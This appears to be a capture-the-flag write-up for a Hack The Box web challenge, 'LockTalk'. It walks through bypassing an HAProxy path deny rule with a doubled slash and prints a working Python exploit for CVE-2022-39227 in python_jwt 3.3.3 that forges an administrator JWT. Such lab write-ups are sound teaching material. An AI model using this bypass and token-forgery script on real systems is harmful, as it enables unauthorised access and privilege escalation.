# LockTalk

In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.

## Writeup

The site use **three** different **api**:

```python
@api_blueprint.route('/get_ticket', methods=['GET'])
def get_ticket():

    claims = {
        "role": "guest", 
        "user": "guest_user"
    }
    
    token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
    return jsonify({'ticket: ': token})


@api_blueprint.route('/chat/<int:chat_id>', methods=['GET'])
@authorize_roles(['guest', 'administrator'])
def chat(chat_id):

    json_file_path = os.path.join(JSON_DIR, f"{chat_id}.json")

    if os.path.exists(json_file_path):
        with open(json_file_path, 'r') as f:
            chat_data = json.load(f)
        
        chat_id = chat_data.get('chat_id', None)
        
        return jsonify({'chat_id': chat_id, 'messages': chat_data['messages']})
    else:
        return jsonify({'error': 'Chat not found'}), 404


@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200
```

We can generate a valid **jwt** but there is a proxy rule that do not allow it:

```
http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

To bypass it, we can add one more **/**:

```
http://{ip}:{port}//api/v1/get_ticket
```

Now we have a valid **jwt** and we can interact with the site.

To obtain the flag, need to call the **/flag** but our role need to be '**administrator**' and by default our role is **guest**:

```python
def authorize_roles(roles):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            token = request.headers.get('Authorization')

            if not token:
                return jsonify({'message': 'JWT token is missing or invalid.'}), 401

            try:
                token = jwt.verify_jwt(token, current_app.config.get('JWT_SECRET_KEY'), ['PS256'])
                user_role = token[1]['role']

                if user_role not in roles:
                    return jsonify({'message': f'{user_role} user does not have the required authorization to access the resource.'}), 403

                return func(*args, **kwargs)
            except Exception as e:
                return jsonify({'message': 'JWT token verification failed.', 'error': str(e)}), 401
        return wrapper
    return decorator
```

So we need to **forge** a valid **jwt** with **administrator** role.

In the **requirements.txt** file we can find the version of **python_jwt**:

```
uwsgi
Flask
requests
python_jwt==3.3.3
```

For this version there is a **CVE** (**CVE-2022-39227**).

So, now integrate the **CVE PoC** with our script:

```python
#!/usr/bin/python3
import requests
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode

ip = "94.237.58.155"
port = 39169

url = f"http://{ip}:{port}//api/v1" # Bypass proxy rule

def get_ticket(s):
    req = s.get(url + "/get_ticket")
    s.headers.update({'Authorization': (req.json())['ticket: ']})
    return req.text

def chat(s, id):
    req = s.get(url + f"/chat/{id}")
    return req.text

def flag(s):
    """
    CVE-2022-39227
    """
    token = s.headers['Authorization']
    [header, payload, signature] = token.split(".")
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload['role'] = 'administrator'
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
    s.headers.update({'Authorization' : new_payload})
    req = s.get(url + "/flag")
    return req.text

if __name__ == "__main__":
    s = requests.Session()
    get_ticket(s)
    print(flag(s))
```

The flag is:

```
HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
```